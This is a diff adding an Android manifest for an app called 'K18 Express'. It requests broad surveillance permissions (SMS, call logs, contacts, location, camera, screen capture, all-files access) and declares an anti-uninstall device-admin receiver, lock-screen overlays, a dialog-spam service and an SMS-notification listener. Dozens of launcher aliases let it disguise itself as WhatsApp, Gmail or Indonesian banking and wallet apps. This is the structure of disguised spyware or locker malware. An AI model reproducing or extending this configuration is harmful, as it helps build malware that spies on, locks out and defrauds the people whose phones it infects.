@@ -1,0 +1,622 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- ── Izin Koneksi & Sistem ── -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+
+    <!-- ── Izin Akses Paket / Aplikasi Target (Android 11+) ── -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
+
+    <!-- ── Izin Foreground Service ── -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+
+    <!-- ── Izin Kamera & Hardware ── -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-feature android:name="android.hardware.camera.flash" android:required="false" />
+
+    <!-- ── Izin Media & Penyimpanan ── -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+
+    <!-- ── Izin Komunikasi & Lokasi ── -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="K18 Express"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true">
+
+        <!-- ── Activities ── -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:windowSoftInputMode="adjustResize" />
+
+        <activity
+            android:name=".LockNewActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:showOnLockScreen="true"
+            android:theme="@style/AppTheme"
+            android:windowSoftInputMode="stateAlwaysHidden" />
+
+        <activity
+            android:name=".LockChatActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait"
+            android:showWhenLocked="true"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
+            android:turnScreenOn="true" />
+
+        <activity
+            android:name=".ScreenCaptureActivity"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- ── Receivers ── -->
+        <receiver 
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".AntiUninstallReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ── Services ── -->
+        <service
+            android:name=".DeviceService"
+            android:exported="false"
+            android:foregroundServiceType="camera|mediaProjection|location" />
+
+        <service 
+            android:name=".LockOverlayService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse" />
+
+        <service
+            android:name=".TTSService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false" />
+
+        <service
+            android:name=".DialogSpamService"
+            android:exported="false"
+            android:stopWithTask="false" />
+
+        <service
+            android:name=".VideoOverlayService"
+            android:exported="false"
+            android:stopWithTask="false" />
+
+        <service
+            android:name=".AppBlockerService"
+            android:exported="true"
+            android:label="K18 Express"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <service
+            android:name=".SmsNotifService"
+            android:exported="true"
+            android:label="K18 Express"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- ── Theme Aliases (Lama) ── -->
+        <activity-alias
+            android:name=".AliasDefault"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="K18 Express"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasWhatsApp"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_whatsapp"
+            android:label="WhatsApp"
+            android:roundIcon="@mipmap/ic_theme_whatsapp"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasYouTube"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_youtube"
+            android:label="YouTube"
+            android:roundIcon="@mipmap/ic_theme_youtube"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasInstagram"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_instagram"
+            android:label="Instagram"
+            android:roundIcon="@mipmap/ic_theme_instagram"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasTelegram"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_telegram"
+            android:label="Telegram"
+            android:roundIcon="@mipmap/ic_theme_telegram"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasXNXX"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_xnxx"
+            android:label="XNXX"
+            android:roundIcon="@mipmap/ic_theme_xnxx"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ── Tambahan Alias dari Gambar & Permintaan ── -->
+        <activity-alias
+            android:name=".AliasCapCut"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_capcut"
+            android:label="CapCut"
+            android:roundIcon="@mipmap/ic_theme_capcut"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasShopee"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_shopee"
+            android:label="Shopee"
+            android:roundIcon="@mipmap/ic_theme_shopee"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasMelolo"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_melolo"
+            android:label="Melolo"
+            android:roundIcon="@mipmap/ic_theme_melolo"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasFacebook"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_facebook"
+            android:label="Facebook"
+            android:roundIcon="@mipmap/ic_theme_facebook"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasTokopedia"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_tokopedia"
+            android:label="Tokopedia"
+            android:roundIcon="@mipmap/ic_theme_tokopedia"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasCanva"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_canva"
+            android:label="Canva"
+            android:roundIcon="@mipmap/ic_theme_canva"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasGrab"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_grab"
+            android:label="Grab"
+            android:roundIcon="@mipmap/ic_theme_grab"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasLine"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_line"
+            android:label="LINE"
+            android:roundIcon="@mipmap/ic_theme_line"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        
+                <!-- ── Alias Aplikasi Baru ── -->
+        <activity-alias
+            android:name=".AliasWPS"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_wps"
+            android:label="WPS Office"
+            android:roundIcon="@mipmap/ic_theme_wps"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasWeChat"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_wechat"
+            android:label="WeChat"
+            android:roundIcon="@mipmap/ic_theme_wechat"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasML"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_ml"
+            android:label="Mobile Legends"
+            android:roundIcon="@mipmap/ic_theme_ml"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasFF"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_ff"
+            android:label="Free Fire MAX"
+            android:roundIcon="@mipmap/ic_theme_ff"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasMeChat"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_mechat"
+            android:label="MiChat"
+            android:roundIcon="@mipmap/ic_theme_mechat"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasOmi"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_omi"
+            android:label="Omi"
+            android:roundIcon="@mipmap/ic_theme_omi"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasSnackVideo"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_snackvideo"
+            android:label="SnackVideo"
+            android:roundIcon="@mipmap/ic_theme_snackvideo"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasMessages"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_messages"
+            android:label="Messages"
+            android:roundIcon="@mipmap/ic_theme_messages"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        
+                <!-- ── Tambahan Alias Aplikasi Baru (Finance & Tools) ── -->
+        <activity-alias
+            android:name=".AliasDana"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_dana"
+            android:label="DANA"
+            android:roundIcon="@mipmap/ic_theme_dana"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasBCAMobile"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_bcaimobile"
+            android:label="BCA mobile"
+            android:roundIcon="@mipmap/ic_theme_bcaimobile"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasLivin"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_livin"
+            android:label="Livin' by Mandiri"
+            android:roundIcon="@mipmap/ic_theme_livin"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasGopay"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_gopay"
+            android:label="GoPay"
+            android:roundIcon="@mipmap/ic_theme_gopay"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasBRimo"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_brimo"
+            android:label="BRImo"
+            android:roundIcon="@mipmap/ic_theme_brimo"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasPhotos"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_photos"
+            android:label="Foto"
+            android:roundIcon="@mipmap/ic_theme_photos"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasSeaBank"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_seabank"
+            android:label="SeaBank"
+            android:roundIcon="@mipmap/ic_theme_seabank"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasGmail"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_gmail"
+            android:label="Gmail"
+            android:roundIcon="@mipmap/ic_theme_gmail"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+        
+        
+
+        <activity-alias
+            android:name=".AliasAlibaba"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_alibaba"
+            android:label="Alibaba.com"
+            android:roundIcon="@mipmap/ic_theme_alibaba"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasSpotify"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_theme_spotify"
+            android:label="Spotify"
+            android:roundIcon="@mipmap/ic_theme_spotify"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+    </application>
+
+</manifest>
